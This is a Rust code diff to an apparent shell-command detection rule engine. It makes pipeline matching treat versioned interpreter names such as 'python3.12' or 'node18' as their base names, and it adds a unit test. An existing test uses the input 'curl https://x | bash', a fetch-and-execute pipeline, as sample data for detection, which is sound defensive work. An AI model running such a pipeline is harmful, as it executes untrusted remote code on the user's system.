@@ -233,11 +233,24 @@ fn expect_string_list(key: &str, value: &Value) -> Result<Vec<String>, CompileEr
     Ok(out)
 }
 
+/// Pipeline head match on basename. A trailing version suffix is also
+/// tried (`python3.12` / `node18` / `lua5.4` match `python` / `node` /
+/// `lua`), so versioned interpreter binaries need no enumeration.
+fn pipeline_head_matches(list: &[String], head: &str) -> bool {
+    let unversioned = head.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
+    let unversioned = if unversioned.is_empty() {
+        head
+    } else {
+        unversioned
+    };
+    list.iter().any(|h| h == head || h == unversioned)
+}
+
 /// True if `from` appears as a head (or prefix-unwrapped head) anywhere in
 /// this argv tree, including nested `inner_argv` / `subst_argv`.
 fn subst_tree_has_from(argv: &Argv, from: &[String]) -> bool {
     let unwrapped = unwrap_all_prefix_wrappers(argv);
-    if from.iter().any(|f| f == unwrapped.head_basename()) {
+    if pipeline_head_matches(from, unwrapped.head_basename()) {
         return true;
     }
     argv.inner_argv
@@ -264,9 +277,9 @@ fn walk_argv_for_pipeline_from_to(
 ) -> bool {
     let unwrapped = unwrap_all_prefix_wrappers(argv);
     let head = unwrapped.head_basename();
-    let matches_to = to.iter().any(|t| t == head);
+    let matches_to = pipeline_head_matches(to, head);
     if !*seen_from {
-        if from.iter().any(|f| f == head) {
+        if pipeline_head_matches(from, head) {
             *seen_from = true;
         }
     } else if matches_to {
@@ -646,6 +659,16 @@ shell.pipeline:
         let input = bash_input("./curl https://x | bash");
         let facts = facts::extract(&input);
         assert!(evaluate(&node, &facts, &input));
+    }
+
+    #[test]
+    fn pipeline_head_matches_strips_version_suffix() {
+        let list = vec!["python".to_string(), "node".to_string(), ".".to_string()];
+        assert!(pipeline_head_matches(&list, "python3.12"));
+        assert!(pipeline_head_matches(&list, "node18"));
+        assert!(pipeline_head_matches(&list, "."));
+        assert!(!pipeline_head_matches(&list, "pythonx"));
+        assert!(!pipeline_head_matches(&list, "3.12"));
     }
 
     #[test]
